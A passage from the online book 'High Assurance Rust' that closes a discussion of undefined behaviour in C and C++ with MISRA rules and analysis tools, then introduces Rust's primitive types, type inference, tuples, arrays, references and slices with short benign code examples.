<p><strong>Program continues with corrupted state:</strong> Internal state becomes logically invalid, but the program continues to execute. It may crash at a later point in time, if some arbitrary condition is met, or simply finish but produce the wrong result.</p>
<ul>
<li>This case is more challenging to detect, it can require more thorough test cases to uncover.</li>
</ul>
</li>
<li>
<p><strong>Program works as expected, despite relying on UB:</strong> The program appears correct from a testing perspective, but the UB is a "time bomb" waiting to trigger. The program may no longer work compiled for a different architecture, with a newer compiler, or simply using different settings.</p>
<ul>
<li>Detection requires a change or update of the build toolchain. And, if the UB manifests as case 2 above, detection may not be immediate.</li>
</ul>
</li>
<li>
<p><strong>Program is vulnerable to attack:</strong> The program doesn't trigger UB given expected inputs, but will if an attacker provides a specially-crafted input. Exploiting memory corruption bugs entails triggering UB (we'll see next chapter).</p>
<ul>
<li>This is the worst case scenario - an attacker detects UB our tests failed to catch, and then leverages it to compromise production assets.</li>
</ul>
</li>
</ol>
<p>The first three potential consequences of UB are a threat to functionality and reliability.
The fourth is a threat to security.
That's why the MISRA C standard includes this broad rule:</p>
<blockquote>
<p><strong>[AR, Rule 1.3]</strong> Eliminate all occurrences of undefined behavior<sup class="footnote-reference" id="fr-MISRA_2012-3"><a href="#footnote-MISRA_2012">5</a></sup></p>
</blockquote>
<p>Rust's design generally makes it easier to comply with the rule.
The developer isn't responsible for remembering hundreds of obscure UB edge cases simultaneously, and then enforcing them without fail across a million-line codebase.
Instead, the Rust compiler checks for potential issues.
Automatically and accurately.</p>
<h2 id="takeaway-6"><a class="header" href="#takeaway-6">Takeaway</a></h2>
<p>Our best tools can't pinpoint every Undefined Behavior in a moderately-sized C or C++ codebase.</p>
<ul>
<li>
<p>Commercial static analysis tools suffer from false positives: actionable results are often buried in noise. Moreover, a lot of UB is difficult to design a detection algorithm for. As you may recall from Chapter 2, important problems in static analysis, like aliasing, are mathematically undecidable.</p>
</li>
<li>
<p>Dynamic tools (like LLVM's open-source <code>UBSan</code><sup class="footnote-reference" id="fr-UBSan-1"><a href="#footnote-UBSan">17</a></sup>, <code>ASan</code><sup class="footnote-reference" id="fr-ASan-1"><a href="#footnote-ASan">18</a></sup>, and <code>TSan</code><sup class="footnote-reference" id="fr-TSan-1"><a href="#footnote-TSan">19</a></sup>) have improved greatly in recent years, but still miss bugs due to fundamental limitations of dynamic testing (tiny sample of program state-space). Even when combined with coverage-guided fuzzing (introduced in Chapter 12).</p>
</li>
</ul>
<p>That's a part of why standards like MISRA C exist, and why countless engineering hours are devoted to ensuring these standards are followed.</p>
<p>Reducing defect rate is an uphill battle.
One could make the argument that, due to the vast amount of Undefined Behavior C and C++ allow for in their respective standards, it's a war of attrition.
Winners pay an incredible engineering cost - in tool licensing, processes that slow shipping, and debugging person-hours.
Or in service disruption, should the UB lead to an exploitable vulnerability.</p>
<p>So let's start learning that safe subset of Rust!
Rust isn't perfect, but eliminating UB is certainly its strong suit.</p>
<blockquote>
<p><strong><code>gcc</code> hasn't surrendered the fight!</strong></p>
<p>Given a weak type system and a high-UB written specification, we believe that C compilers have low assurance ceilings with respect to memory safety<sup class="footnote-reference" id="fr-CompilerAssurance-1"><a href="#footnote-CompilerAssurance">20</a></sup>.
But important advances are still being made.
And, given C's widespread usage, every inch of progress is high-impact.</p>
<p><code>gcc</code> 12 offers improved, experimental, static taint analysis<sup class="footnote-reference" id="fr-GCC-1"><a href="#footnote-GCC">21</a></sup> (flow tracking for untrusted data).
In conjunction with source annotations, that's a way to systematically review potential attack entry points.
And an advanced feature not currently offered by <code>rustc</code>.</p>
<p>This same version adds a new <code>-Wanalyzer-use-of-uninitialized-value</code> flag<sup class="footnote-reference" id="fr-GCC-2"><a href="#footnote-GCC">21</a></sup>.
Unlike the <code>-Wuninitialized</code> warning our above use of <code>-Wall</code> encapsulated, this new flag uses branch-sensitive static analysis of flows between functions.
That may mean less false positives <em>and</em> more actionable warnings.</p>
<p>We did not test <code>gcc</code> 12's ability to detect the aforementioned "Dirty Pipe"<sup class="footnote-reference" id="fr-DirtyPipe-3"><a href="#footnote-DirtyPipe">6</a></sup> kernel vulnerability.
But that could be a worthwhile exercise for interested readers.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-MISRA_TALK">
<p><a href="https://www.youtube.com/watch?v=LCZotsYizRI"><em>The Misra C Coding Standard and its Role in the Development (SAS Talk)</em></a>. Roberto Bagnara (2018). <a href="#fr-MISRA_TALK-1">↩</a></p>
</li>
<li id="footnote-ISOC">
<p><a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf"><em>ISO/IEC 9899:TC3</em></a>. International Organization for Standardization (2007). Note newer standards for the C language must be paid for, they are not freely available online. The points we make in this book are still applicable to newer C standards. <a href="#fr-ISOC-1">↩</a> <a href="#fr-ISOC-2">↩2</a> <a href="#fr-ISOC-3">↩3</a> <a href="#fr-ISOC-4">↩4</a></p>
</li>
<li id="footnote-NasalDemons">
<p><a href="http://www.catb.org/jargon/html/N/nasal-demons.html"><em>nasal demons</em></a>. According to an infamous Usenet post, the arbitrary consequences of UB could include making "demons fly out of your nose". Hence UB is sometimes joking referred to as "nasal demons". <a href="#fr-NasalDemons-1">↩</a></p>
</li>
<li id="footnote-UndefResearch">
<p><a href="https://people.csail.mit.edu/nickolai/papers/wang-undef-2012-08-21.pdf"><em>Undefined Behavior: What Happened to My Code?</em></a>. Xi Wang, Haogang Chen, Alvin Cheung, Zhihao Jia, Nickolai Zeldovich, M. Frans Kaashoek (2012). <a href="#fr-UndefResearch-1">↩</a> <a href="#fr-UndefResearch-2">↩2</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a> <a href="#fr-MISRA_2012-2">↩2</a> <a href="#fr-MISRA_2012-3">↩3</a></p>
</li>
<li id="footnote-DirtyPipe">
<p><a href="https://dirtypipe.cm4all.com/"><em>The Dirty Pipe Vulnerability</em></a>. Max Kellerman (2022). <a href="#fr-DirtyPipe-1">↩</a> <a href="#fr-DirtyPipe-2">↩2</a> <a href="#fr-DirtyPipe-3">↩3</a></p>
</li>
<li id="footnote-UndefRust">
<p><a href="https://doc.rust-lang.org/reference/behavior-considered-undefined.html"><em>Behavior considered undefined</em></a>. The Rust Reference (Accessed 2022). <a href="#fr-UndefRust-1">↩</a> <a href="#fr-UndefRust-2">↩2</a></p>
</li>
<li id="footnote-RustcBug">
<p><a href="https://internals.rust-lang.org/t/unsoundness-in-pin/11311">Unsoundness in <code>Pin</code></a>. comex (2019). <a href="#fr-RustcBug-1">↩</a></p>
</li>
<li id="footnote-FLS">
<p><a href="https://spec.ferrocene.dev/index.html"><em>Ferrocene Language Specification</em></a>. Ferrous Systems (2022). <a href="#fr-FLS-1">↩</a></p>
</li>
<li id="footnote-FLSUndef">
<p><a href="https://spec.ferrocene.dev/undefined-behavior.html"><em>List of undefined behavior</em></a>. Ferrous Systems (2023). <a href="#fr-FLSUndef-1">↩</a></p>
</li>
<li id="footnote-Miri">
<p><a href="https://github.com/rust-lang/miri"><em><code>miri</code></em></a>. Ralf Jung (Accessed 2022). <a href="#fr-Miri-1">↩</a></p>
</li>
<li id="footnote-CppUndef">
<p><a href="https://www.youtube.com/watch?v=v1COuU2vU_w"><em>CppCon 2017: "Undefined Behavior in 2017"</em></a>. John Regehr (2017). <a href="#fr-CppUndef-1">↩</a> <a href="#fr-CppUndef-2">↩2</a> <a href="#fr-CppUndef-3">↩3</a></p>
</li>
<li id="footnote-RalfUB">
<p><a href="https://www.ralfj.de/blog/2021/11/18/ub-good-idea.html"><em>Undefined Behavior deserves a better reputation</em></a>. Ralf Jung (2021). <a href="#fr-RalfUB-1">↩</a></p>
</li>
<li id="footnote-IntOverflow">
<p>This claim may have debatable edge cases. For example, if <code>overflow-checks = false</code> is specified in <code>Cargo.toml</code> (the default setting for the optimized <code>release</code> profile) then integer overflow can happen at runtime. That's not technically UB in Rust, like it is in C/C++, because you can reliably expect two's complement wrap. But it might still cause unanticipated bugs in the context of your larger application. <a href="#fr-IntOverflow-1">↩</a></p>
</li>
<li id="footnote-Core">
<p><a href="https://doc.rust-lang.org/core/"><em>The Rust Core Library</em></a>. The Rust Team (Accessed 2022). <a href="#fr-Core-1">↩</a></p>
</li>
<li id="footnote-EAX">
<p>Technically, <code>%eax</code> is the lower 4 bytes of the 8-byte <code>%rax</code> register on an x86-64 system. <code>%rax</code> is used for return values. In this example, we're dereferencing 8-byte pointers but returning a 4-byte integer. <a href="#fr-EAX-1">↩</a></p>
</li>
<li id="footnote-UBSan">
<p><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html"><em>UndefinedBehaviorSanitizer</em></a>. LLVM Project (Accessed 2022). <a href="#fr-UBSan-1">↩</a></p>
</li>
<li id="footnote-ASan">
<p><a href="https://clang.llvm.org/docs/AddressSanitizer.html"><em>AddressSanitizer</em></a>. LLVM Project (Accessed 2022). <a href="#fr-ASan-1">↩</a></p>
</li>
<li id="footnote-TSan">
<p><a href="https://clang.llvm.org/docs/ThreadSanitizer.html"><em>ThreadSanitizer</em></a>. LLVM Project (Accessed 2022). <a href="#fr-TSan-1">↩</a></p>
</li>
<li id="footnote-CompilerAssurance">
<p>On the other hand, C compilers are mature and well-understood from a safety qualification perspective. And further ahead in formal verification. As an example, the CompCert<sup class="footnote-reference" id="fr-CompCert-1"><a href="#footnote-CompCert">22</a></sup> C compiler proves that source code semantics match machine code semantics. No current Rust compiler can claim that level or kind of assurance. <a href="#fr-CompilerAssurance-1">↩</a></p>
</li>
<li id="footnote-GCC">
<p><a href="https://developers.redhat.com/articles/2022/04/12/state-static-analysis-gcc-12-compiler"><em>The state of static analysis in the GCC 12 compiler</em></a>. David Malcom (2022). <a href="#fr-GCC-1">↩</a> <a href="#fr-GCC-2">↩2</a></p>
</li>
<li id="footnote-CompCert">
<p><a href="https://compcert.org/"><em>CompCert</em></a>. Xavier Leroy (Accessed 2022). <a href="#fr-CompCert-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-low-level-data-1-of-6"><a class="header" href="#rust-low-level-data-1-of-6">Rust: Low-Level Data (1 of 6)</a></h1>
<p>Thus far we've discussed Rust's type system in the context of static assurance.
Specifically preventing mutable aliasing and eliminating UB.</p>
<p>But, for the majority of day-to-day development, one could argue that these are secondary benefits.
And that the true value of Rust's type system lies in its expressiveness, in the ability to map our problem domain to flexible constructs.</p>
<p>This line of argument quickly becomes subjective, you should form your own opinions of Rust over time.
But the first step in solving a programming problem is typically representing data to process.
So we'll sample the options Rust affords us.</p>
<h2 id="primitive-types"><a class="header" href="#primitive-types">Primitive Types</a></h2>
<p>Rust's primitive types are similar to almost any programming language you're familiar with - it has the usual booleans, integers, floats, characters, strings, etc.</p>
<p>One key difference, relative to higher-level interpreted languages, is that integers and floats have a fixed width.
This is a hallmark of high-performance systems languages, where individual numbers need to be stored in CPU registers (like C) and not as structures in heap memory (like Python).</p>
<p>This hardware-level concern has two important implications: bounded ranges and host-specific widths.</p>
<h3 id="1-bounded-numeric-ranges"><a class="header" href="#1-bounded-numeric-ranges">1) Bounded Numeric Ranges</a></h3>
<p>Rust has 12 primitive numeric types:</p>
<ul>
<li>
<p>5 unsigned integer types: <code>u8</code>, <code>u16</code>, <code>u32</code>, <code>u64</code>, <code>u128</code>, and <code>usize</code>.</p>
</li>
<li>
<p>5 signed integer types: <code>i8</code>, <code>i16</code>, <code>i32</code>, <code>i64</code>, <code>i128</code>, and <code>isize</code>.</p>
</li>
<li>
<p>2 IEEE-compliant floats: <code>f32</code> (at least 6 decimal digits precision) and <code>f64</code> (at least 15 decimal digits).</p>
</li>
</ul>
<p>The postfix in the type name indicates bit-width, e.g. a <code>u128</code> is 128 bits (16 bytes) wide.
Here's the important implication: the range of values a given integer type can represent is finite.
Upper and lower bounds are determined by both signedness and width.
Consider the below table (non-exhaustive):</p>
<div class="table-wrapper"><table><thead><tr><th>Type</th><th>Width</th><th>Lower Bound</th><th>Upper Bound</th></tr></thead><tbody>
<tr><td>u8</td><td>1 byte</td><td>0</td><td>255</td></tr>
<tr><td>i8</td><td>1 byte</td><td>-128</td><td>127</td></tr>
<tr><td>u32</td><td>4 bytes</td><td>0</td><td>4,294,967,295</td></tr>
<tr><td>i64</td><td>8 bytes</td><td>-2<sup>63</sup></td><td>2<sup>63</sup>-1</td></tr>
</tbody></table>
</div>
<p>Rust's standard library provides handy limit constants for upper and lower bounds, so you don't have to remember these ranges off-hand or reference an exhaustive table:</p>
<pre><code class="language-rust noplaypen">assert_eq!(0, u8::MIN);
assert_eq!(255, u8::MAX);</code></pre>
<p>Exceeding the range of a type causes "wrap around".
In rare cases, that's desirable behavior.
We made judicious and intentional use of <code>wrapping_add</code> when implementing the RC4 cipher to simulate modular arithmetic.
To demonstrate how that works, consider what would happen if we exceeded the <code>255</code> upper bound of a <code>u8</code>:</p>
<pre><code class="language-rust noplaypen">let x: u8 = 200;
let y: u8 = 100;

assert_eq!(x.wrapping_add(y), 44);</code></pre>
<p><code>44</code> is <code>300 % 256</code>, e.g. total modulo range size.
Outside of cryptographic contexts, silent wraparound is considered an <em>integer overflow</em> bug.
If <code>200</code> represented the number of dollars in a bank account and the account owner deposited another <code>100</code> dollars, they'd be shocked to find a <code>44</code> account balance on their receipt!</p>
<p>This is where we get into some subtleties in Rust.
Had we written <code>assert_eq!(x + y, 44);</code> instead of <code>assert_eq!(x.wrapping_add(y), 44);</code>, the program would have spit out an error warning of an overflow:</p>
<pre><code class="language-ignore">error: this arithmetic operation will overflow
 --&gt; src/main.rs:8:12
  |
8 | assert_eq!(x + y, 44);
  |            ^^^^^ attempt to compute `200_u8 + 100_u8`, which would overflow
  |
  = note: `#[deny(arithmetic_overflow)]` on by default
</code></pre>
<p>We got lucky here in the sense that both <code>x</code> and <code>y</code> are constants, so the overflow could be detected at compile-time.
Rust uses optional runtime checks to catch overflow for variables whose values aren't known beforehand - a topic we'll return to in Chapter 4 when discussing safety in-depth.</p>
<p>There's one more detail to keep in mind about integer overflow in Rust: unlike C/C++, it's not a potential source of UB.
The rules of wrap around are specified and universal across target platforms<sup class="footnote-reference" id="fr-IntWrap-1"><a href="#footnote-IntWrap">1</a></sup>.</p>
<h3 id="2-host-specific-integers"><a class="header" href="#2-host-specific-integers">2) Host-specific Integers</a></h3>
<p>You have noticed the <code>usize</code> and <code>isize</code> types, unsigned and signed integers respectively, don't specify a bit-width like their counterparts.
That's because their size depends on the specific machine the program is compiled for.</p>
<p>Both are 4 bytes long if compiling for a 32-bit system, and 8 bytes long on a modern 64-bit system.
In theory, they could be 16 bytes long for a 128-bit system - but no commercial processors use 128-bit architectures.</p>
<p>Given what we said about ranges and overflow, machine-dependant (aka host-specific) types might strike you as ambiguous.
Maybe even dangerous.
Per MISRA, you'd be right:</p>
<blockquote>
<p><strong>[RR, Directive 4.6]</strong> Use numeric types of explicit size and signedness<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<p>While Rust lets us use explicit numeric types were possible, indexing is an exception: <code>usize</code> types are required for collection indexing (e.g. in <code>my_vec[i] = j</code>, <code>i</code> must be a <code>usize</code>).
This is because, under-the-hood, indexing a container often involves computing a memory address<sup class="footnote-reference" id="fr-IndexAside-1"><a href="#footnote-IndexAside">3</a></sup>.
And the width of an address depends on the target machine.</p>
<p>Now Rust lets us cast from an explicit numeric type, like an <code>u64</code>, into a <code>usize</code>.
Perhaps we need to perform this operation prior to indexing, to comply with the spirit of the above MISRA rule.</p>
<p>Casting between numeric types is one of the very few cases where Rust permits type casting.
Which helps with another rule:</p>
<blockquote>
<p><strong>[AR, Rule 11.3]</strong> Never cast from a reference to one type into a reference to another type<sup class="footnote-reference" id="fr-MISRA_2012-2"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<p>Rust does allow safe and explicit conversion between types (not between references), via the concept of <em>traits</em> - specifically traits called <code>From</code><sup class="footnote-reference" id="fr-TraitFrom-1"><a href="#footnote-TraitFrom">4</a></sup> and <code>Into</code><sup class="footnote-reference" id="fr-TraitInto-1"><a href="#footnote-TraitInto">5</a></sup>.
We'll explain traits in the next section and use <code>From</code> in a later chapter.</p>
<h2 id="type-inference"><a class="header" href="#type-inference">Type Inference</a></h2>
<p>Rust is strongly and statically typed.
Every value has a type known at compile time.
Even generic parameters, whose ultimate type is decided during compilation (more on this later).</p>
<p>Unlike older statically typed languages, Rust uses <em>type inference</em><sup class="footnote-reference" id="fr-TypeInference-1"><a href="#footnote-TypeInference">6</a></sup> to automatically detect the type of an expression in certain cases. As a rule of thumb, explicitly writing out type annotations is:</p>
<ul>
<li>
<p><em>Always required</em> for function signatures (e.g. parameter and return types), global variables, or exported types (e.g. part of a library's public API).</p>
</li>
<li>
<p><em>Occasionally required</em> within the body of a function.</p>
</li>
</ul>
<p>Consider this example:</p>
<pre><code class="language-rust ignore">#![feature(type_name_of_val)]
use std::any::type_name_of_val;

fn sum(x: u128, y: u128) -&gt; u128 {
    x + y
}

fn main() {
    let a = 1;
    let b = 3;
    let c = sum(a, b);

    println!("a is a {} with value {:?}", type_name_of_val(&amp;a), a);
    println!("b is a {} with value {:?}", type_name_of_val(&amp;b), b);
    println!("c is a {} with value {:?}", type_name_of_val(&amp;c), c);

    let mut list = Vec::new();
    list.push(a);
    list.push(b);
    list.push(c);

    println!("list is a {} with value {:?}", type_name_of_val(&amp;list), list);
}</code></pre>
<p>This snippet will print:</p>
<pre><code class="language-ignore">a is a u128 with value 1
b is a u128 with value 3
c is a u128 with value 4
list is a alloc::vec::Vec&lt;u128&gt; with value [1, 3, 4]
</code></pre>
<p>Two instances of automated inference occurred here.</p>
<p>First, primitive types were inferred from a function signature.
If the function <code>sum</code> wasn't part of the program, <code>let a = 1;</code> would be equivalent to <code>let a: i32 = 1;</code>.
<code>i32</code>, a 4-byte signed integer, is Rust's default integer type.
But, because of the line <code>let c = sum(a, b)</code>, the compiler realized that <code>a</code> is actually a <code>u128</code>, a 16-byte unsigned integer.</p>
<p>Second, the type of a dynamic collection was inferred from the type of the item stored.
All three of the below statements are equivalent:</p>
<ul>
<li><code>let mut list = Vec::new();</code> - inferred type (like the above).</li>
<li><code>let mut list: Vec&lt;u128&gt; = Vec::new();</code> - explicit type annotation.</li>
<li><code>let mut list = Vec::&lt;u128&gt;::new();</code> - explicit constructor.</li>
</ul>
<p>We got to use the convenient inferred shorthand because the example program had at least one <code>list.push()</code> statement.
The compiler looked at the type of items being pushed to the vector, <code>u128</code> integers in this case, and decided the type of the vector.</p>
<blockquote>
<p><strong>What about heterogeneous collections?</strong></p>
<p>If we wanted a vector to store items of varying but logically related types, we couldn't rely on type inference.
We'd have to explicitly use the <code>dyn</code> keyword and something called a "trait object".
That's not a language feature we'll need or cover in this book.</p>
</blockquote>
<h2 id="tuples-vs-arrays"><a class="header" href="#tuples-vs-arrays">Tuples vs. Arrays</a></h2>
<p>Rust provides two ways to represent an ordered, fixed-size sequences of values: tuples and arrays.</p>
<ul>
<li>
<p>Tuples can group multiple values of <em>different</em> types, but can only be indexed by a <em>constant</em>.</p>
</li>
<li>
<p>Arrays can group multiple values of <em>only the same</em> type, but can be indexed by a <em>variable</em>.</p>
</li>
</ul>
<h3 id="tuples"><a class="header" href="#tuples">Tuples</a></h3>
<p>There's no hard-and-fast rule for when to use which, but tuples are particularly useful as a return type.
For cases where a function should return multiple values.</p>
<p>[Slightly contrived] example: say we need to compute lengths for the sides of a 30-60-90 triangle (a special "right triangle"<sup class="footnote-reference" id="fr-Triangle-1"><a href="#footnote-Triangle">7</a></sup>) based on its shortest side.
There's a known formula:</p>
<pre><code class="language-rust noplaypen">// Side proportions are 1 : 2 : square_root(3)
fn compute_30_60_90_tri_side_len(short_side: f64) -&gt; (f64, f64, f64) {
  (
    short_side,
    short_side * 2.0,
    short_side * 3_f64.sqrt() // "_f64" is an optional type postfix syntax
  )
}

fn main() {
  let tri_sides = compute_30_60_90_tri_side_len(10.0);

  // Tuple constant indexing
  assert_eq!(tri_sides.0, 10.0);
  assert_eq!(tri_sides.1, 20.0);
  assert_eq!(tri_sides.2, 17.32050807568877);

  // Tuple destructuring
  let (a, b, c) = compute_30_60_90_tri_side_len(10.0);

  assert_eq!(a, 10.0);
  assert_eq!(b, 20.0);
  assert_eq!(c, 17.32050807568877);
}</code></pre>
<p>Function <code>compute_30_60_90_tri_side_len</code> returns three values: the length of 3 sides of a triangle.
In our first call to this function, the inferred type for variable <code>tri_sides</code> is <code>(f64, f64, f64)</code>.
Each float is accessible by constant position, but not by a variable (e.g. <code>tri_sides.1</code> works, but <code>tri_sides.i</code> or <code>tri_sides[i]</code> would not).</p>
<p>We could have defined a structure with named fields, but tuples provide a concise shorthand.
And we can set names with a technique called <em>destructuring</em>, demonstrated by our second call to <code>compute_30_60_90_tri_side_len</code>.
Instead of assigning to a single tuple variable, we destructure and assign each tuple item to its own named variable (e.g. <code>a</code>, <code>b</code>, and <code>c</code>).</p>
<h3 id="arrays"><a class="header" href="#arrays">Arrays</a></h3>
<p>Arrays are a general-purpose data structure you've likely seen in other programming languages, so we won't dwell on them here.
The Rust syntax for arrays declaration is <code>[T; N]</code>.
Each value stored is of type <code>T</code> and <code>N</code> is the length of the array.
It works like so:</p>
<pre><code class="language-rust noplaypen">// Explicit array type declaration
let numbers: [u64; 3] = [42, 1337, 0];

// Inferred array type (`[&amp;str; 4]`, array of read-only string references)
let operating_systems = ["Linux", "FreeBSD", "Tock", "VxWorks"];

// Initialization of all elements (1,000 of them) to a single value (0)
let mut buffer = [0; 1_000];

// Index-based write access
for i in 0..1_000 {
  assert_eq!(buffer[i], 0); // Should have been zero-initialized
  buffer[i] = i; // Overwrite with new value
}

assert_eq!(buffer[0], 0);
assert_eq!(buffer[1], 1);
assert_eq!(buffer[2], 2);

// Iterator-based write access
for num in buffer.iter_mut() {
  *num += 7; // "*" is a dereference for write
}

assert_eq!(buffer[0], 7);
assert_eq!(buffer[1], 8);
assert_eq!(buffer[2], 9);</code></pre>
<p>The above uses two loops to modify the contents of a 1,000 item array.
The first uses traditional, index-based access (e.g. <code>buffer[i]</code>).
The second uses an <em>iterator</em> (e.g. <code>buffer.iter_mut()</code>) to perform a similar operation.</p>
<p>Iterators enable functional programming constructs, like <code>map</code> and <code>filter</code>.
While that entails a performance penalty in many languages, you'll see these constructs used often in idiomatic Rust.
Because they can actually result in <em>faster</em> code.</p>
<p>Why?
There's an implicit contract in the first loop above: <code>i</code> has to be smaller than the length of the array.
Otherwise we'd <em>write out-of-bounds</em>, past the end of the array.
To ensure safety, the compiler has to add a runtime bounds check to the first loop (but not the second).
That check has a cost.
We'll see what failing the check looks like when discussing error handling later in this chapter.</p>
<blockquote>
<p><strong>Arrays vs. Vectors</strong></p>
<p>Unlike the <code>Vec</code> we added items to when discussion type inference, arrays cannot grow dynamically.
Their capacity is fixed.
While that constraint can be inconvenient, it makes arrays portable - don't need to rely on runtime libraries for dynamic memory allocation to use arrays.</p>
</blockquote>
<p>One major difference between Rust and C arrays is that the former have length explicitly encoded as part of the type.
This has several advantages, one of which is compliance with:</p>
<blockquote>
<p><strong>[AR, Rule 17.5]</strong> Arrays used as function parameters must have the correct number of elements<sup class="footnote-reference" id="fr-MISRA_2012-3"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<p>We already introduced references in the previous chapter, in the context of a function that increments an integer.
They're a modern alternative to raw pointers:</p>
<pre><code class="language-rust noplaypen">fn incr(a: &amp;mut isize, b: &amp;isize) {
    *a += *b;
}

fn main() {
  let mut x = 3;
  let y = 5;

  incr(&amp;mut x, &amp;y);

  assert_eq!(x, 8);
  assert_eq!(y, 5);
}</code></pre>
<p>References are crucial for systems programming.
Recall that they enable <em>pass-by-reference</em> semantics (hand off a "pointer"), instead of <em>pass-by-value</em> (copy the entire value).
That level of control is essential, it enables performant manipulation of large values.
The programmer can choose when to perform a <em>shallow copy</em> (duplicate only a reference) and when to perform a <em>deep copy</em> (duplicate all data).
The former means less time spent copying bytes and less total memory used.</p>
<p>We'll return to the topic of references when discussing ownership later in this chapter.
When dealing with ownership errors, you'll quickly realize that Rust strongly encourages this MISRA rule:</p>
<blockquote>
<p><strong>[AR, Rule 8.13]</strong> References should be immutable whenever possible<sup class="footnote-reference" id="fr-MISRA_2012-4"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<h2 id="slices"><a class="header" href="#slices">Slices</a></h2>
<p>Slices are a concept closely related to references, they also come in immutable and mutable variants:</p>
<ul>
<li>
<p><code>&amp;[T]</code> is an immutable, shared slice of <code>T</code>s.</p>
</li>
<li>
<p><code>&amp;mut [T]</code> is a mutable, exclusive slice of <code>T</code>s.</p>
</li>
</ul>
<p>Both slice types are "partial views" into a sequence of values that are stored within some other, larger value.
Let's make sense of that statement with an example:</p>
<pre><code class="language-rust noplaypen">// Array of 5 items
let mut buffer_overflow_defenses = [
    "stack canary",
    "ASLR",
    "NX bit",
    "CFI",
    "Intel CET",
    "ARM MTE",
];

// Create an immutable slice of the first 3
// [..=2] is inclusive range notation, equivalent to [..3]
let basic_defenses = &amp;buffer_overflow_defenses[..=2];

assert_eq!(basic_defenses, &amp;["stack canary", "ASLR", "NX bit"]);

// Create an mutable slice of the last 2
let advanced_defenses = &amp;mut buffer_overflow_defenses[4..];

assert_eq!(advanced_defenses, &amp;mut ["Intel CET", "ARM MTE"]);

// Modify via slice
advanced_defenses[1] = "safe Rust!";

// Notice both slice and it's "backing storage" are updated
assert_eq!(advanced_defenses, &amp;mut ["Intel CET", "safe Rust!"]);
assert_eq!(buffer_overflow_defenses[5], "safe Rust!");</code></pre>
<p>Sub-division of a larger sequence is one convenient use of slices, as demonstrated above.
You might recall seeing slice range notation (e.g. <code>[..=2]</code> and <code>[3..]</code>) in the previous chapter as well.
We used it in IETF test vector validation, to grab 16-byte chunks out of the RC4 key stream.</p>
<p>Slices are also useful in creating idiomatic APIs.
We leveraged this approach when defining parameters to our RC4 functions (like <code>new</code> and <code>apply_keystream</code>), but didn't explain the rationale in detail.
Consider the below:</p>
<pre><code class="language-rust noplaypen">fn count_total_bytes(byte_slice: &amp;[u8]) -&gt; usize {
    let mut cnt = 0;

    // Underscore indicates unused variable
    for _ in byte_slice {
        cnt += 1;
    }

    // Oops - we didn't need to loop, there's a built-in length method!
    assert_eq!(cnt, byte_slice.len());

    cnt
}

fn main() {
    let byte_arr: [u8; 4] = [0xC, 0xA, 0xF, 0xE];

    // Vec init shorthand
    let mut byte_vec = vec![0xB, 0xA, 0xD];

    // Push more data dynamically
    byte_vec.push(0xF);
    byte_vec.push(0x0);
    byte_vec.push(0x0);
    byte_vec.push(0xD);

    // Note both types can be borrowed as &amp;[u8]
    assert_eq!(count_total_bytes(&amp;byte_arr), 4);
    assert_eq!(count_total_bytes(&amp;byte_vec), 7);
}</code></pre>
<p>The advantage of slices in parameter signatures is that different kinds of collections can be <em>borrowed as a slice</em>.
In the above, we wrote one function that works for both dynamic vectors of bytes and fixed-size arrays of bytes.</p>
<p>Finally, we'd be remiss if we didn't mention the relationship between strings (<code>String</code> type) and string slices (<code>&amp;str</code> type).
A proper discussion of the topic involves a fair bit of complexity, and strings aren't particularly relevant to code we'll be writing in this book.
Though the data structures we build can certainly store strings, we'll forgo a detailed discussion and recommend section 8.2 of the official Rust book<sup class="footnote-reference" id="fr-TRPL-1"><a href="#footnote-TRPL">8</a></sup> - "Storing UTF-8 Encoded Text with Strings" - if you're interested.</p>
<blockquote>
<p><strong>The <code>vec!</code> Macro</strong></p>
<p>The above code includes short-hand notation for initializing a vector of elements.
<code>let mut byte_vec = vec![0xB, 0xA, 0xD];</code> is equivalent to:</p>
<pre><code class="language-rust noplaypen">let mut byte_vec = Vec::new();
byte_vec.push(0xB);
byte_vec.push(0xA);
byte_vec.push(0xD);</code></pre>
<p>In fact, our <code>main</code> function above could have avoided <code>push</code> calls entirely with:</p>
<pre><code class="language-rust noplaypen">let mut byte_vec = vec![0xB, 0xA, 0xD, 0xF, 0x0, 0x0, 0xD];</code></pre>
<p>This syntax may look similar to <code>byte_arr</code>'s initialization, but don't confuse the two: arrays have a fixed capacity, we can't <code>push</code> new items to an array after initialization.</p>
</blockquote>
<h2 id="takeaway-7"><a class="header" href="#takeaway-7">Takeaway</a></h2>
<p>We've briefly covered primitives (focusing on integers), tuples, arrays, references, and slices.
And gotten a feel for type inference along the way.
You've now seen low-level techniques for representing and manipulating data in Rust.</p>
<p>Instead of spending dozens more pages on the intricacies, we'll move on to more exciting and interesting features of the language: ways to express higher-level constructs.</p>
<p>You'll master all of these topics through hands-on experience as we progress through the book.
Our present goal is to rapidly survey Rust's fundamentals.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-IntWrap">
<p><a href="https://huonw.github.io/blog/2016/04/myths-and-legends-about-integer-overflow-in-rust/"><em>Myths and Legends about Integer Overflow in Rust</em></a>. Huon Wilson (2016). <a href="#fr-IntWrap-1">↩</a></p>
</li>
<li id="footnote-MISRA_2012">
